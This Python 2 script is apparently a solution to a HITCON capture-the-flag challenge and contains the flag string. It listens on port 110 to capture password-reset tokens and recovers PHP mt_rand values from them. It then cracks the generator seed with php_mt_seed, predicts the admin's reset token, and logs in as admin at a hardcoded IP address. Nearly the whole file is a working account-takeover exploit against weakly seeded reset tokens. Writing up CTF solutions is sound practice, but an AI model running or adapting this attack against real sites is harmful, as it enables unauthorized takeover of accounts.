import socket
import re

# Logging so we can catch whether the keepalive connection dropped
import logging
logging.basicConfig(level=logging.DEBUG)

# Run this script as root so that you can open this privileged port.
serversock = socket.socket()
serversock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serversock.bind(('', 110))
serversock.listen(1)

# Open a thread to continually read tokens
tokens = []
def server_thread():
    while 1:
        try:
            conn, addr = serversock.accept()
            t = conn.recv(1024)
            t = re.findall(r'token=(\d+)', t)[0]
            print "         got token", t
            tokens.append(int(t))
        except:
            continue

import threading
t = threading.Thread(target=server_thread)
t.daemon = True
t.start()


import requests
s = requests.Session()
URL = 'http://52.69.0.204/'
MYIP = 0x7f000001 # 127.0.0.1, replace with your actual source IP

# Hit the server a bunch of times just to try and get a new connection
sessions = []
for i in xrange(200):
    print "Hitting the server meaninglessly:", i
    tmpsess = requests.Session()
    tmpsess.get(URL)
    sessions.append(tmpsess)

# Register a new user and get some sample tokens
import random
import string
import time
username = ''.join(random.choice(string.letters) for _ in xrange(16))

print "Registering", username
print "    response:", s.post(URL, data={'username': username, 'password': 'password', 'mode': 'register'}).content

print "Resetting", username
print "    response:", s.post(URL, data={'username': username, 'mode': 'reset'}).content
while not tokens:
    time.sleep(0.01)
t1 = tokens.pop() ^ MYIP
print "    mt_rand val:", t1

print "Resetting", username
print "    response:", s.post(URL, data={'username': username, 'mode': 'reset'}).content
while not tokens:
    time.sleep(0.01)
t2 = tokens.pop() ^ MYIP
print "    mt_rand val:", t2

# print "Verifying", username
# print "    response:", s.post(URL, data={'username': username, 'mode': 'verify', 'token': str(t2 ^ MYIP)}).content

# Crack the PHP mt_rand seed using the observed tokens
import subprocess
def range_args(n): return map(str, [n, n, 0, (1<<31)-1])
p = subprocess.Popen(['./php_mt_seed'] + range_args(t1) + range_args(t2), stdout=subprocess.PIPE)
while True:
    line = p.stdout.readline()
    if not line:
        raise Exception("No seeds found!")
    seed = re.findall(r'seed = (\d+)', line)
    if seed:
        break
seed = int(seed[0])

# Validate the seed and get the next random value
mt_rands = subprocess.check_output(['php', '-r', "mt_srand(%d); echo mt_rand(), ' ', mt_rand(), ' ', mt_rand(), ' ', mt_rand();" % seed])
mt_rands = map(int, mt_rands.split())
assert mt_rands[:2] == [t1, t2], "rand vals %r didn't match" % mt_rands

next_mt_rand = mt_rands[2]

# Reset admin's password using the recovered token
print "Resetting", 'admin'
print "    response:", s.post(URL, data={'username': 'admin', 'mode': 'reset'}).content

print "Verifying", 'admin'
resp = s.post(URL, data={'username': 'admin', 'mode': 'verify', 'token': next_mt_rand}).content
print "    response:", resp

# Get flag
password = re.findall(r'password: (\w+)', resp)[0]
print "Logging in as", 'admin'
resp = s.post(URL, data={'username': 'admin', 'password': password, 'mode': 'login'}).content
print "    response:", resp

# hitcon{howsgiraffesfeeling?no!youonlythinkofyourself}
